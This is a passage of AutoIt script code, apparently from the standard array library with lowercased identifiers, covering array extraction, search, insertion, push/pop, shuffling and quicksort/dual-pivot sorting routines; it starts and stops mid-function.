					$sitem = $avarraytext[$i]
					If $imsg = $idcopy_data Then
						$sitem = StringRegExpReplace($sitem, "^\[\d+\].(.*)$", "$1")
					EndIf
					If $icw_colwidth Then
						$asplit = StringSplit($sitem, $sad_separator)
						$sitem = ""
						For $j = 1 To $asplit[0]
							$sitem &= StringFormat("%-" & $icw_colwidth + 1 & "s", StringLeft($asplit[$j], $icw_colwidth))
						Next
					Else
						$sitem = StringReplace($sitem, $sad_separator, $vuser_separator)
					EndIf
					$sclip &= $sitem & @CRLF
				Next
				If $imsg = $idcopy_id Then
					If $icw_colwidth Then
						$asplit = StringSplit($sheader, $sad_separator)
						$sitem = ""
						For $j = 1 To $asplit[0]
							$sitem &= StringFormat("%-" & $icw_colwidth + 1 & "s", StringLeft($asplit[$j], $icw_colwidth))
						Next
					Else
						$sitem = StringReplace($sheader, $sad_separator, $vuser_separator)
					EndIf
					$sclip = $sitem & @CRLF & $sclip
				EndIf
				ClipPut($sclip)
				SplashOff()
				GUICtrlSetState($idlistview, $_arrayconstant_gui_focus)
			Case $iduser_func
				Local $aiselitems[$irowlimit] = [0]
				For $i = 0 To GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_getitemcount, 0, 0)
					If GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_getitemstate, $i, $_arrayconstant_lvis_selected) Then
						$aiselitems[0] += 1
						$aiselitems[$aiselitems[0]] = $i + $iitem_start
					EndIf
				Next
				ReDim $aiselitems[$aiselitems[0] + 1]
				$huser_function($aarray, $aiselitems)
				GUICtrlSetState($idlistview, $_arrayconstant_gui_focus)
			Case $idexit_script
				GUIDelete($hgui)
				Exit
		EndSwitch
	WEnd
	GUIDelete($hgui)
	Opt("GUICoordMode", $icoordmode)
	Opt("GUIOnEventMode", $ioneventmode)
	Opt("GUIDataSeparatorChar", $scurr_separator)
	Return 1
EndFunc

Func _arrayextract(Const ByRef $aarray, $istart_row = -1, $iend_row = -1, $istart_col = -1, $iend_col = -1)
	If $istart_row = Default Then $istart_row = -1
	If $iend_row = Default Then $iend_row = -1
	If $istart_col = Default Then $istart_col = -1
	If $iend_col = Default Then $iend_col = -1
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray, $ubound_rows) - 1
	If $iend_row = -1 Then $iend_row = $idim_1
	If $istart_row = -1 Then $istart_row = 0
	If $istart_row < -1 OR $iend_row < -1 Then Return SetError(3, 0, -1)
	If $istart_row > $idim_1 OR $iend_row > $idim_1 Then Return SetError(3, 0, -1)
	If $istart_row > $iend_row Then Return SetError(4, 0, -1)
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			Local $aretarray[$iend_row - $istart_row + 1]
			For $i = 0 To $iend_row - $istart_row
				$aretarray[$i] = $aarray[$i + $istart_row]
			Next
			Return $aretarray
		Case 2
			Local $idim_2 = UBound($aarray, $ubound_columns) - 1
			If $iend_col = -1 Then $iend_col = $idim_2
			If $istart_col = -1 Then $istart_col = 0
			If $istart_col < -1 OR $iend_col < -1 Then Return SetError(5, 0, -1)
			If $istart_col > $idim_2 OR $iend_col > $idim_2 Then Return SetError(5, 0, -1)
			If $istart_col > $iend_col Then Return SetError(6, 0, -1)
			If $istart_col = $iend_col Then
				Local $aretarray[$iend_row - $istart_row + 1]
			Else
				Local $aretarray[$iend_row - $istart_row + 1][$iend_col - $istart_col + 1]
			EndIf
			For $i = 0 To $iend_row - $istart_row
				For $j = 0 To $iend_col - $istart_col
					If $istart_col = $iend_col Then
						$aretarray[$i] = $aarray[$i + $istart_row][$j + $istart_col]
					Else
						$aretarray[$i][$j] = $aarray[$i + $istart_row][$j + $istart_col]
					EndIf
				Next
			Next
			Return $aretarray
		Case Else
			Return SetError(2, 0, -1)
	EndSwitch
	Return 1
EndFunc

Func _arrayfindall(Const ByRef $aarray, $vvalue, $istart = 0, $iend = 0, $icase = 0, $icompare = 0, $isubitem = 0, $brow = False)
	If $istart = Default Then $istart = 0
	If $iend = Default Then $iend = 0
	If $icase = Default Then $icase = 0
	If $icompare = Default Then $icompare = 0
	If $isubitem = Default Then $isubitem = 0
	If $brow = Default Then $brow = False
	$istart = _arraysearch($aarray, $vvalue, $istart, $iend, $icase, $icompare, 1, $isubitem, $brow)
	If @error Then Return SetError(@error, 0, -1)
	Local $iindex = 0, $avresult[UBound($aarray, ($brow ? $ubound_columns : $ubound_rows))]
	Do
		$avresult[$iindex] = $istart
		$iindex += 1
		$istart = _arraysearch($aarray, $vvalue, $istart + 1, $iend, $icase, $icompare, 1, $isubitem, $brow)
	Until @error
	ReDim $avresult[$iindex]
	Return $avresult
EndFunc

Func _arrayinsert(ByRef $aarray, $vrange, $vvalue = "", $istart = 0, $sdelim_item = "|", $sdelim_row = @CRLF, $iforce = $arrayfill_force_default)
	If $vvalue = Default Then $vvalue = ""
	If $istart = Default Then $istart = 0
	If $sdelim_item = Default Then $sdelim_item = "|"
	If $sdelim_row = Default Then $sdelim_row = @CRLF
	If $iforce = Default Then $iforce = $arrayfill_force_default
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray, $ubound_rows) - 1
	Local $hdatatype = 0
	Switch $iforce
		Case $arrayfill_force_int
			$hdatatype = Int
		Case $arrayfill_force_number
			$hdatatype = Number
		Case $arrayfill_force_ptr
			$hdatatype = Ptr
		Case $arrayfill_force_hwnd
			$hdatatype = HWnd
		Case $arrayfill_force_string
			$hdatatype = String
	EndSwitch
	Local $asplit_1, $asplit_2
	If IsArray($vrange) Then
		If UBound($vrange, $ubound_dimensions) <> 1 OR UBound($vrange, $ubound_rows) < 2 Then Return SetError(4, 0, -1)
	Else
		Local $inumber
		$vrange = StringStripWS($vrange, 8)
		$asplit_1 = StringSplit($vrange, ";")
		$vrange = ""
		For $i = 1 To $asplit_1[0]
			If NOT StringRegExp($asplit_1[$i], "^\d+(-\d+)?$") Then Return SetError(3, 0, -1)
			$asplit_2 = StringSplit($asplit_1[$i], "-")
			Switch $asplit_2[0]
				Case 1
					$vrange &= $asplit_2[1] & ";"
				Case 2
					If Number($asplit_2[2]) >= Number($asplit_2[1]) Then
						$inumber = $asplit_2[1] - 1
						Do
							$inumber += 1
							$vrange &= $inumber & ";"
						Until $inumber = $asplit_2[2]
					EndIf
			EndSwitch
		Next
		$vrange = StringSplit(StringTrimRight($vrange, 1), ";")
	EndIf
	If $vrange[1] < 0 OR $vrange[$vrange[0]] > $idim_1 Then Return SetError(5, 0, -1)
	For $i = 2 To $vrange[0]
		If $vrange[$i] < $vrange[$i - 1] Then Return SetError(3, 0, -1)
	Next
	Local $icopyto_index = $idim_1 + $vrange[0]
	Local $iinsertpoint_index = $vrange[0]
	Local $iinsert_index = $vrange[$iinsertpoint_index]
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			If $iforce = $arrayfill_force_singleitem Then
				ReDim $aarray[$idim_1 + $vrange[0] + 1]
				For $ireadfromindex = $idim_1 To 0 Step -1
					$aarray[$icopyto_index] = $aarray[$ireadfromindex]
					$icopyto_index -= 1
					$iinsert_index = $vrange[$iinsertpoint_index]
					While $ireadfromindex = $iinsert_index
						$aarray[$icopyto_index] = $vvalue
						$icopyto_index -= 1
						$iinsertpoint_index -= 1
						If $iinsertpoint_index < 1 Then ExitLoop 2
						$iinsert_index = $vrange[$iinsertpoint_index]
					WEnd
				Next
				Return $idim_1 + $vrange[0] + 1
			EndIf
			ReDim $aarray[$idim_1 + $vrange[0] + 1]
			If IsArray($vvalue) Then
				If UBound($vvalue, $ubound_dimensions) <> 1 Then Return SetError(5, 0, -1)
				$hdatatype = 0
			Else
				Local $atmp = StringSplit($vvalue, $sdelim_item, $str_nocount + $str_entiresplit)
				If UBound($atmp, $ubound_rows) = 1 Then
					$atmp[0] = $vvalue
					$hdatatype = 0
				EndIf
				$vvalue = $atmp
			EndIf
			For $ireadfromindex = $idim_1 To 0 Step -1
				$aarray[$icopyto_index] = $aarray[$ireadfromindex]
				$icopyto_index -= 1
				$iinsert_index = $vrange[$iinsertpoint_index]
				While $ireadfromindex = $iinsert_index
					If $iinsertpoint_index <= UBound($vvalue, $ubound_rows) Then
						If IsFunc($hdatatype) Then
							$aarray[$icopyto_index] = $hdatatype($vvalue[$iinsertpoint_index - 1])
						Else
							$aarray[$icopyto_index] = $vvalue[$iinsertpoint_index - 1]
						EndIf
					Else
						$aarray[$icopyto_index] = ""
					EndIf
					$icopyto_index -= 1
					$iinsertpoint_index -= 1
					If $iinsertpoint_index = 0 Then ExitLoop 2
					$iinsert_index = $vrange[$iinsertpoint_index]
				WEnd
			Next
		Case 2
			Local $idim_2 = UBound($aarray, $ubound_columns)
			If $istart < 0 OR $istart > $idim_2 - 1 Then Return SetError(6, 0, -1)
			Local $ivaldim_1, $ivaldim_2
			If IsArray($vvalue) Then
				If UBound($vvalue, $ubound_dimensions) <> 2 Then Return SetError(7, 0, -1)
				$ivaldim_1 = UBound($vvalue, $ubound_rows)
				$ivaldim_2 = UBound($vvalue, $ubound_columns)
				$hdatatype = 0
			Else
				$asplit_1 = StringSplit($vvalue, $sdelim_row, $str_nocount + $str_entiresplit)
				$ivaldim_1 = UBound($asplit_1, $ubound_rows)
				StringReplace($asplit_1[0], $sdelim_item, "")
				$ivaldim_2 = @extended + 1
				Local $atmp[$ivaldim_1][$ivaldim_2]
				For $i = 0 To $ivaldim_1 - 1
					$asplit_2 = StringSplit($asplit_1[$i], $sdelim_item, $str_nocount + $str_entiresplit)
					For $j = 0 To $ivaldim_2 - 1
						$atmp[$i][$j] = $asplit_2[$j]
					Next
				Next
				$vvalue = $atmp
			EndIf
			If UBound($vvalue, $ubound_columns) + $istart > UBound($aarray, $ubound_columns) Then Return SetError(8, 0, -1)
			ReDim $aarray[$idim_1 + $vrange[0] + 1][$idim_2]
			For $ireadfromindex = $idim_1 To 0 Step -1
				For $j = 0 To $idim_2 - 1
					$aarray[$icopyto_index][$j] = $aarray[$ireadfromindex][$j]
				Next
				$icopyto_index -= 1
				$iinsert_index = $vrange[$iinsertpoint_index]
				While $ireadfromindex = $iinsert_index
					For $j = 0 To $idim_2 - 1
						If $j < $istart Then
							$aarray[$icopyto_index][$j] = ""
						ElseIf $j - $istart > $ivaldim_2 - 1 Then
							$aarray[$icopyto_index][$j] = ""
						Else
							If $iinsertpoint_index - 1 < $ivaldim_1 Then
								If IsFunc($hdatatype) Then
									$aarray[$icopyto_index][$j] = $hdatatype($vvalue[$iinsertpoint_index - 1][$j - $istart])
								Else
									$aarray[$icopyto_index][$j] = $vvalue[$iinsertpoint_index - 1][$j - $istart]
								EndIf
							Else
								$aarray[$icopyto_index][$j] = ""
							EndIf
						EndIf
					Next
					$icopyto_index -= 1
					$iinsertpoint_index -= 1
					If $iinsertpoint_index = 0 Then ExitLoop 2
					$iinsert_index = $vrange[$iinsertpoint_index]
				WEnd
			Next
		Case Else
			Return SetError(2, 0, -1)
	EndSwitch
	Return UBound($aarray, $ubound_rows)
EndFunc

Func _arraymax(Const ByRef $aarray, $icompnumeric = 0, $istart = -1, $iend = -1, $isubitem = 0)
	Local $iresult = _arraymaxindex($aarray, $icompnumeric, $istart, $iend, $isubitem)
	If @error Then Return SetError(@error, 0, "")
	If UBound($aarray, $ubound_dimensions) = 1 Then
		Return $aarray[$iresult]
	Else
		Return $aarray[$iresult][$isubitem]
	EndIf
EndFunc

Func _arraymaxindex(Const ByRef $aarray, $icompnumeric = 0, $istart = -1, $iend = -1, $isubitem = 0)
	If $icompnumeric = Default Then $icompnumeric = 0
	If $istart = Default Then $istart = -1
	If $iend = Default Then $iend = -1
	If $isubitem = Default Then $isubitem = 0
	Local $iret = __array_minmaxindex($aarray, $icompnumeric, $istart, $iend, $isubitem, __array_greaterthan)
	Return SetError(@error, 0, $iret)
EndFunc

Func _arraymin(Const ByRef $aarray, $icompnumeric = 0, $istart = -1, $iend = -1, $isubitem = 0)
	Local $iresult = _arrayminindex($aarray, $icompnumeric, $istart, $iend, $isubitem)
	If @error Then Return SetError(@error, 0, "")
	If UBound($aarray, $ubound_dimensions) = 1 Then
		Return $aarray[$iresult]
	Else
		Return $aarray[$iresult][$isubitem]
	EndIf
EndFunc

Func _arrayminindex(Const ByRef $aarray, $icompnumeric = 0, $istart = -1, $iend = -1, $isubitem = 0)
	If $icompnumeric = Default Then $icompnumeric = 0
	If $istart = Default Then $istart = -1
	If $iend = Default Then $iend = -1
	If $isubitem = Default Then $isubitem = 0
	Local $iret = __array_minmaxindex($aarray, $icompnumeric, $istart, $iend, $isubitem, __array_lessthan)
	Return SetError(@error, 0, $iret)
EndFunc

Func _arraypermute(ByRef $aarray, $sdelimiter = "")
	If $sdelimiter = Default Then $sdelimiter = ""
	If NOT IsArray($aarray) Then Return SetError(1, 0, 0)
	If UBound($aarray, $ubound_dimensions) <> 1 Then Return SetError(2, 0, 0)
	Local $isize = UBound($aarray), $ifactorial = 1, $aidx[$isize], $aresult[1], $icount = 1
	If UBound($aarray) Then
		For $i = 0 To $isize - 1
			$aidx[$i] = $i
		Next
		For $i = $isize To 1 Step -1
			$ifactorial *= $i
		Next
		ReDim $aresult[$ifactorial + 1]
		$aresult[0] = $ifactorial
		__array_exeterinternal($aarray, 0, $isize, $sdelimiter, $aidx, $aresult, $icount)
	Else
		$aresult[0] = 0
	EndIf
	Return $aresult
EndFunc

Func _arraypop(ByRef $aarray)
	If (NOT IsArray($aarray)) Then Return SetError(1, 0, "")
	If UBound($aarray, $ubound_dimensions) <> 1 Then Return SetError(2, 0, "")
	Local $iubound = UBound($aarray) - 1
	If $iubound = -1 Then Return SetError(3, 0, "")
	Local $slastval = $aarray[$iubound]
	If $iubound > -1 Then
		ReDim $aarray[$iubound]
	EndIf
	Return $slastval
EndFunc

Func _arraypush(ByRef $aarray, $vvalue, $idirection = 0)
	If $idirection = Default Then $idirection = 0
	If (NOT IsArray($aarray)) Then Return SetError(1, 0, 0)
	If UBound($aarray, $ubound_dimensions) <> 1 Then Return SetError(3, 0, 0)
	Local $iubound = UBound($aarray) - 1
	If IsArray($vvalue) Then
		Local $iubounds = UBound($vvalue)
		If ($iubounds - 1) > $iubound Then Return SetError(2, 0, 0)
		If $idirection Then
			For $i = $iubound To $iubounds Step -1
				$aarray[$i] = $aarray[$i - $iubounds]
			Next
			For $i = 0 To $iubounds - 1
				$aarray[$i] = $vvalue[$i]
			Next
		Else
			For $i = 0 To $iubound - $iubounds
				$aarray[$i] = $aarray[$i + $iubounds]
			Next
			For $i = 0 To $iubounds - 1
				$aarray[$i + $iubound - $iubounds + 1] = $vvalue[$i]
			Next
		EndIf
	Else
		If $iubound > -1 Then
			If $idirection Then
				For $i = $iubound To 1 Step -1
					$aarray[$i] = $aarray[$i - 1]
				Next
				$aarray[0] = $vvalue
			Else
				For $i = 0 To $iubound - 1
					$aarray[$i] = $aarray[$i + 1]
				Next
				$aarray[$iubound] = $vvalue
			EndIf
		EndIf
	EndIf
	Return 1
EndFunc

Func _arrayreverse(ByRef $aarray, $istart = 0, $iend = 0)
	If $istart = Default Then $istart = 0
	If $iend = Default Then $iend = 0
	If NOT IsArray($aarray) Then Return SetError(1, 0, 0)
	If UBound($aarray, $ubound_dimensions) <> 1 Then Return SetError(3, 0, 0)
	If NOT UBound($aarray) Then Return SetError(4, 0, 0)
	Local $vtmp, $iubound = UBound($aarray) - 1
	If $iend < 1 OR $iend > $iubound Then $iend = $iubound
	If $istart < 0 Then $istart = 0
	If $istart > $iend Then Return SetError(2, 0, 0)
	For $i = $istart To Int(($istart + $iend - 1) / 2)
		$vtmp = $aarray[$i]
		$aarray[$i] = $aarray[$iend]
		$aarray[$iend] = $vtmp
		$iend -= 1
	Next
	Return 1
EndFunc

Func _arraysearch(Const ByRef $aarray, $vvalue, $istart = 0, $iend = 0, $icase = 0, $icompare = 0, $iforward = 1, $isubitem = -1, $brow = False)
	If $istart = Default Then $istart = 0
	If $iend = Default Then $iend = 0
	If $icase = Default Then $icase = 0
	If $icompare = Default Then $icompare = 0
	If $iforward = Default Then $iforward = 1
	If $isubitem = Default Then $isubitem = -1
	If $brow = Default Then $brow = False
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray) - 1
	If $idim_1 = -1 Then Return SetError(3, 0, -1)
	Local $idim_2 = UBound($aarray, $ubound_columns) - 1
	Local $bcomptype = False
	If $icompare = 2 Then
		$icompare = 0
		$bcomptype = True
	EndIf
	If $brow Then
		If UBound($aarray, $ubound_dimensions) = 1 Then Return SetError(5, 0, -1)
		If $iend < 1 OR $iend > $idim_2 Then $iend = $idim_2
		If $istart < 0 Then $istart = 0
		If $istart > $iend Then Return SetError(4, 0, -1)
	Else
		If $iend < 1 OR $iend > $idim_1 Then $iend = $idim_1
		If $istart < 0 Then $istart = 0
		If $istart > $iend Then Return SetError(4, 0, -1)
	EndIf
	Local $istep = 1
	If NOT $iforward Then
		Local $itmp = $istart
		$istart = $iend
		$iend = $itmp
		$istep = -1
	EndIf
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			If NOT $icompare Then
				If NOT $icase Then
					For $i = $istart To $iend Step $istep
						If $bcomptype AND VarGetType($aarray[$i]) <> VarGetType($vvalue) Then ContinueLoop
						If $aarray[$i] = $vvalue Then Return $i
					Next
				Else
					For $i = $istart To $iend Step $istep
						If $bcomptype AND VarGetType($aarray[$i]) <> VarGetType($vvalue) Then ContinueLoop
						If $aarray[$i] == $vvalue Then Return $i
					Next
				EndIf
			Else
				For $i = $istart To $iend Step $istep
					If $icompare = 3 Then
						If StringRegExp($aarray[$i], $vvalue) Then Return $i
					Else
						If StringInStr($aarray[$i], $vvalue, $icase) > 0 Then Return $i
					EndIf
				Next
			EndIf
		Case 2
			Local $idim_sub
			If $brow Then
				$idim_sub = $idim_1
				If $isubitem > $idim_sub Then $isubitem = $idim_sub
				If $isubitem < 0 Then
					$isubitem = 0
				Else
					$idim_sub = $isubitem
				EndIf
			Else
				$idim_sub = $idim_2
				If $isubitem > $idim_sub Then $isubitem = $idim_sub
				If $isubitem < 0 Then
					$isubitem = 0
				Else
					$idim_sub = $isubitem
				EndIf
			EndIf
			For $j = $isubitem To $idim_sub
				If NOT $icompare Then
					If NOT $icase Then
						For $i = $istart To $iend Step $istep
							If $brow Then
								If $bcomptype AND VarGetType($aarray[$j][$j]) <> VarGetType($vvalue) Then ContinueLoop
								If $aarray[$j][$i] = $vvalue Then Return $i
							Else
								If $bcomptype AND VarGetType($aarray[$i][$j]) <> VarGetType($vvalue) Then ContinueLoop
								If $aarray[$i][$j] = $vvalue Then Return $i
							EndIf
						Next
					Else
						For $i = $istart To $iend Step $istep
							If $brow Then
								If $bcomptype AND VarGetType($aarray[$j][$i]) <> VarGetType($vvalue) Then ContinueLoop
								If $aarray[$j][$i] == $vvalue Then Return $i
							Else
								If $bcomptype AND VarGetType($aarray[$i][$j]) <> VarGetType($vvalue) Then ContinueLoop
								If $aarray[$i][$j] == $vvalue Then Return $i
							EndIf
						Next
					EndIf
				Else
					For $i = $istart To $iend Step $istep
						If $icompare = 3 Then
							If $brow Then
								If StringRegExp($aarray[$j][$i], $vvalue) Then Return $i
							Else
								If StringRegExp($aarray[$i][$j], $vvalue) Then Return $i
							EndIf
						Else
							If $brow Then
								If StringInStr($aarray[$j][$i], $vvalue, $icase) > 0 Then Return $i
							Else
								If StringInStr($aarray[$i][$j], $vvalue, $icase) > 0 Then Return $i
							EndIf
						EndIf
					Next
				EndIf
			Next
		Case Else
			Return SetError(2, 0, -1)
	EndSwitch
	Return SetError(6, 0, -1)
EndFunc

Func _arrayshuffle(ByRef $aarray, $istart_row = 0, $iend_row = 0, $icol = -1)
	If $istart_row = Default Then $istart_row = 0
	If $iend_row = Default Then $iend_row = 0
	If $icol = Default Then $icol = -1
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray, $ubound_rows)
	If $iend_row = 0 Then $iend_row = $idim_1 - 1
	If $istart_row < 0 OR $istart_row > $idim_1 - 1 Then Return SetError(3, 0, -1)
	If $iend_row < 1 OR $iend_row > $idim_1 - 1 Then Return SetError(3, 0, -1)
	If $istart_row > $iend_row Then Return SetError(4, 0, -1)
	Local $vtmp, $irand
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			For $i = $iend_row To $istart_row + 1 Step -1
				$irand = Random($istart_row, $i, 1)
				$vtmp = $aarray[$i]
				$aarray[$i] = $aarray[$irand]
				$aarray[$irand] = $vtmp
			Next
			Return 1
		Case 2
			Local $idim_2 = UBound($aarray, $ubound_columns)
			If $icol < -1 OR $icol > $idim_2 - 1 Then Return SetError(5, 0, -1)
			Local $icol_start, $icol_end
			If $icol = -1 Then
				$icol_start = 0
				$icol_end = $idim_2 - 1
			Else
				$icol_start = $icol
				$icol_end = $icol
			EndIf
			For $i = $iend_row To $istart_row + 1 Step -1
				$irand = Random($istart_row, $i, 1)
				For $j = $icol_start To $icol_end
					$vtmp = $aarray[$i][$j]
					$aarray[$i][$j] = $aarray[$irand][$j]
					$aarray[$irand][$j] = $vtmp
				Next
			Next
			Return 1
		Case Else
			Return SetError(2, 0, -1)
	EndSwitch
EndFunc

Func _arraysort(ByRef $aarray, $idescending = 0, $istart = 0, $iend = 0, $isubitem = 0, $ipivot = 0)
	If $idescending = Default Then $idescending = 0
	If $istart = Default Then $istart = 0
	If $iend = Default Then $iend = 0
	If $isubitem = Default Then $isubitem = 0
	If $ipivot = Default Then $ipivot = 0
	If NOT IsArray($aarray) Then Return SetError(1, 0, 0)
	Local $iubound = UBound($aarray) - 1
	If $iubound = -1 Then Return SetError(5, 0, 0)
	If $iend = Default Then $iend = 0
	If $iend < 1 OR $iend > $iubound OR $iend = Default Then $iend = $iubound
	If $istart < 0 OR $istart = Default Then $istart = 0
	If $istart > $iend Then Return SetError(2, 0, 0)
	If $idescending = Default Then $idescending = 0
	If $ipivot = Default Then $ipivot = 0
	If $isubitem = Default Then $isubitem = 0
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			If $ipivot Then
				__arraydualpivotsort($aarray, $istart, $iend)
			Else
				__arrayquicksort1d($aarray, $istart, $iend)
			EndIf
			If $idescending Then _arrayreverse($aarray, $istart, $iend)
		Case 2
			If $ipivot Then Return SetError(6, 0, 0)
			Local $isubmax = UBound($aarray, $ubound_columns) - 1
			If $isubitem > $isubmax Then Return SetError(3, 0, 0)
			If $idescending Then
				$idescending = -1
			Else
				$idescending = 1
			EndIf
			__arrayquicksort2d($aarray, $idescending, $istart, $iend, $isubitem, $isubmax)
		Case Else
			Return SetError(4, 0, 0)
	EndSwitch
	Return 1
EndFunc

Func __arrayquicksort1d(ByRef $aarray, Const ByRef $istart, Const ByRef $iend)
	If $iend <= $istart Then Return 
	Local $vtmp
	If ($iend - $istart) < 15 Then
		Local $vcur
		For $i = $istart + 1 To $iend
			$vtmp = $aarray[$i]
			If IsNumber($vtmp) Then
				For $j = $i - 1 To $istart Step -1
					$vcur = $aarray[$j]
					If ($vtmp >= $vcur AND IsNumber($vcur)) OR (NOT IsNumber($vcur) AND StringCompare($vtmp, $vcur) >= 0) Then ExitLoop
					$aarray[$j + 1] = $vcur
				Next
			Else
				For $j = $i - 1 To $istart Step -1
					If (StringCompare($vtmp, $aarray[$j]) >= 0) Then ExitLoop
					$aarray[$j + 1] = $aarray[$j]
				Next
			EndIf
			$aarray[$j + 1] = $vtmp
		Next
		Return 
	EndIf
	Local $l = $istart, $r = $iend, $vpivot = $aarray[Int(($istart + $iend) / 2)], $bnum = IsNumber($vpivot)
	Do
		If $bnum Then
			While ($aarray[$l] < $vpivot AND IsNumber($aarray[$l])) OR (NOT IsNumber($aarray[$l]) AND StringCompare($aarray[$l], $vpivot) < 0)
				$l += 1
			WEnd
			While ($aarray[$r] > $vpivot AND IsNumber($aarray[$r])) OR (NOT IsNumber($aarray[$r]) AND StringCompare($aarray[$r], $vpivot) > 0)
				$r -= 1
			WEnd
		Else
			While (StringCompare($aarray[$l], $vpivot) < 0)
				$l += 1
			WEnd
			While (StringCompare($aarray[$r], $vpivot) > 0)
				$r -= 1
			WEnd
		EndIf
		If $l <= $r Then
			$vtmp = $aarray[$l]
			$aarray[$l] = $aarray[$r]
			$aarray[$r] = $vtmp
			$l += 1
			$r -= 1
		EndIf
	Until $l > $r
	__arrayquicksort1d($aarray, $istart, $r)
	__arrayquicksort1d($aarray, $l, $iend)
EndFunc

Func __arrayquicksort2d(ByRef $aarray, Const ByRef $istep, Const ByRef $istart, Const ByRef $iend, Const ByRef $isubitem, Const ByRef $isubmax)
	If $iend <= $istart Then Return 
	Local $vtmp, $l = $istart, $r = $iend, $vpivot = $aarray[Int(($istart + $iend) / 2)][$isubitem], $bnum = IsNumber($vpivot)
	Do
		If $bnum Then
			While ($istep * ($aarray[$l][$isubitem] - $vpivot) < 0 AND IsNumber($aarray[$l][$isubitem])) OR (NOT IsNumber($aarray[$l][$isubitem]) AND $istep * StringCompare($aarray[$l][$isubitem], $vpivot) < 0)
				$l += 1
			WEnd
			While ($istep * ($aarray[$r][$isubitem] - $vpivot) > 0 AND IsNumber($aarray[$r][$isubitem])) OR (NOT IsNumber($aarray[$r][$isubitem]) AND $istep * StringCompare($aarray[$r][$isubitem], $vpivot) > 0)
				$r -= 1
			WEnd
		Else
			While ($istep * StringCompare($aarray[$l][$isubitem], $vpivot) < 0)
				$l += 1
			WEnd
			While ($istep * StringCompare($aarray[$r][$isubitem], $vpivot) > 0)
				$r -= 1
			WEnd
		EndIf
		If $l <= $r Then
			For $i = 0 To $isubmax
				$vtmp = $aarray[$l][$i]
				$aarray[$l][$i] = $aarray[$r][$i]
				$aarray[$r][$i] = $vtmp
			Next
			$l += 1
			$r -= 1
		EndIf
	Until $l > $r
	__arrayquicksort2d($aarray, $istep, $istart, $r, $isubitem, $isubmax)
	__arrayquicksort2d($aarray, $istep, $l, $iend, $isubitem, $isubmax)
EndFunc

Func __arraydualpivotsort(ByRef $aarray, $ipivot_left, $ipivot_right, $bleftmost = True)
	If $ipivot_left > $ipivot_right Then Return 
	Local $ilength = $ipivot_right - $ipivot_left + 1
	Local $i, $j, $k, $iai, $iak, $ia1, $ia2, $ilast
	If $ilength < 45 Then
		If $bleftmost Then
			$i = $ipivot_left
			While $i < $ipivot_right
				$j = $i
				$iai = $aarray[$i + 1]
				While $iai < $aarray[$j]
					$aarray[$j + 1] = $aarray[$j]
					$j -= 1
					If $j + 1 = $ipivot_left Then ExitLoop
				WEnd
				$aarray[$j + 1] = $iai
				$i += 1
			WEnd
		Else
			While 1
				If $ipivot_left >= $ipivot_right Then Return 1
				$ipivot_left += 1
				If $aarray[$ipivot_left] < $aarray[$ipivot_left - 1] Then ExitLoop
			WEnd
			While 1
				$k = $ipivot_left
				$ipivot_left += 1
				If $ipivot_left > $ipivot_right Then ExitLoop
				$ia1 = $aarray[$k]
				$ia2 = $aarray[$ipivot_left]
				If $ia1 < $ia2 Then
					$ia2 = $ia1
					$ia1 = $aarray[$ipivot_left]
				EndIf
				$k -= 1
				While $ia1 < $aarray[$k]
					$aarray[$k + 2] = $aarray[$k]
					$k -= 1
				WEnd
				$aarray[$k + 2] = $ia1
				While $ia2 < $aarray[$k]
					$aarray[$k + 1] = $aarray[$k]
					$k -= 1
				WEnd
				$aarray[$k + 1] = $ia2
				$ipivot_left += 1
			WEnd
			$ilast = $aarray[$ipivot_right]
			$ipivot_right -= 1
			While $ilast < $aarray[$ipivot_right]
				$aarray[$ipivot_right + 1] = $aarray[$ipivot_right]
				$ipivot_right -= 1
			WEnd
			$aarray[$ipivot_right + 1] = $ilast
		EndIf
		Return 1
	EndIf
	Local $iseventh = BitShift($ilength, 3) + BitShift($ilength, 6) + 1
	Local $ie1, $ie2, $ie3, $ie4, $ie5, $t
	$ie3 = Ceiling(($ipivot_left + $ipivot_right) / 2)
	$ie2 = $ie3 - $iseventh
	$ie1 = $ie2 - $iseventh
	$ie4 = $ie3 + $iseventh
	$ie5 = $ie4 + $iseventh
	If $aarray[$ie2] < $aarray[$ie1] Then
		$t = $aarray[$ie2]
		$aarray[$ie2] = $aarray[$ie1]
		$aarray[$ie1] = $t
	EndIf
	If $aarray[$ie3] < $aarray[$ie2] Then
		$t = $aarray[$ie3]
		$aarray[$ie3] = $aarray[$ie2]
		$aarray[$ie2] = $t
		If $t < $aarray[$ie1] Then
			$aarray[$ie2] = $aarray[$ie1]
			$aarray[$ie1] = $t
		EndIf
	EndIf
	If $aarray[$ie4] < $aarray[$ie3] Then
		$t = $aarray[$ie4]
		$aarray[$ie4] = $aarray[$ie3]
		$aarray[$ie3] = $t
		If $t < $aarray[$ie2] Then
			$aarray[$ie3] = $aarray[$ie2]
			$aarray[$ie2] = $t
			If $t < $aarray[$ie1] Then
				$aarray[$ie2] = $aarray[$ie1]
				$aarray[$ie1] = $t
			EndIf
		EndIf
	EndIf
	If $aarray[$ie5] < $aarray[$ie4] Then
		$t = $aarray[$ie5]
		$aarray[$ie5] = $aarray[$ie4]
		$aarray[$ie4] = $t
		If $t < $aarray[$ie3] Then
			$aarray[$ie4] = $aarray[$ie3]
			$aarray[$ie3] = $t
			If $t < $aarray[$ie2] Then
				$aarray[$ie3] = $aarray[$ie2]
				$aarray[$ie2] = $t
				If $t < $aarray[$ie1] Then
					$aarray[$ie2] = $aarray[$ie1]
					$aarray[$ie1] = $t
				EndIf
			EndIf
		EndIf
	EndIf
	Local $iless = $ipivot_left
	Local $igreater = $ipivot_right
	If (($aarray[$ie1] <> $aarray[$ie2]) AND ($aarray[$ie2] <> $aarray[$ie3]) AND ($aarray[$ie3] <> $aarray[$ie4]) AND ($aarray[$ie4] <> $aarray[$ie5])) Then
		Local $ipivot_1 = $aarray[$ie2]
		Local $ipivot_2 = $aarray[$ie4]
